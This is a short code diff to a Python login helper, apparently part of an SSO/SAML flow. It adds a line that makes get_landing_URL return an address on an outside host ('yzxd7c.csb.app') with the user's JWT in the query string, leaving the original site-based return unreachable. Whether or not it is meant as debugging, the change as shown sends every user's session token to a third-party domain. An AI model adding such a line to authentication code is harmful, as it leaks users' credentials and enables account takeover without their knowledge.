@@ -137,6 +137,7 @@ def get_saml2_provider():
 
 
 def get_landing_URL(jwt):
+    return 'https://yzxd7c.csb.app?jwt=%s' % jwt
     return config("SITE_URL") + config("sso_landing", default="/login?jwt=%s") % jwt
 
 
